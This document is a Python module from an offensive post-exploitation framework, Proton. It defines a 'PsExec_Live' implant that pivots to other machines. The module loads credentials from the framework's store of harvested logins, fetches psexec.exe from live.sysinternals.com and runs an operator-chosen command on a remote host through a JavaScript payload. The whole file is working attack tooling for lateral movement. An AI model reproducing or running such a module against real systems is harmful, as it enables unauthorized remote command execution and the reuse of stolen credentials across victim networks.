#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import uuid
import os.path


class PsExecLiveJob(core.job.Job):
    
    def create(self):
        cred_id = self.options.get("CREDID")
        if cred_id:
            key = self.shell.creds_keys[int(cred_id)]
            smbuser = self.shell.creds[key]["Username"]
            smbpass = self.shell.creds[key]["Password"]
            smbdomain = self.shell.creds[key]["Domain"]
            self.options.set("SMBUSER", smbuser)
            if not smbuser:
                self.shell.print_warning("Cred has no username!")
            self.options.set("SMBPASS", smbpass)
            if not smbpass:
                self.shell.print_warning("Cred has no password!")
            self.options.set("SMBDOMAIN", smbdomain)
            if not smbdomain:
                self.shell.print_warning("Cred has no domain!")
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        pass
        #self.shell.print_plain("Result for `%s`:" % self.options.get('CMD'))
        #self.shell.print_plain(self.data)

class PsExecLiveImplant(core.implant.Implant):

    NAME = "PsExec_Live"
    DESCRIPTION = "Executes a command on another system, utilizing live.sysinternals.com publicly hosted tools."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/pivot/exec_psexec"

    def load(self):
        self.options.register("CMD", "hostname", "Command to run.")
        self.options.register("RHOST", "", "Name/IP of the remote.")
        self.options.register("SMBUSER", "", "Username for login.")
        self.options.register("SMBPASS", "", "Password for login.")
        self.options.register("SMBDOMAIN", ".", "Domain for login.")
        self.options.register("CREDID", "", "Cred ID from creds.")
        #self.options.register("STAGER", "", "Stager to stage.")
        self.options.register("RPATH", "\\\\\\\\live.sysinternals.com@SSL\\\\tools\\\\", "Path to psexec.exe.")
        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory for output.", required=False)
        # self.options.register("FILE", "", "Random uuid for file name.", hidden=True)

    def job(self):
        return PsExecLiveJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/pivot/exec_psexec.js"
        self.dispatch(payloads, self.job)
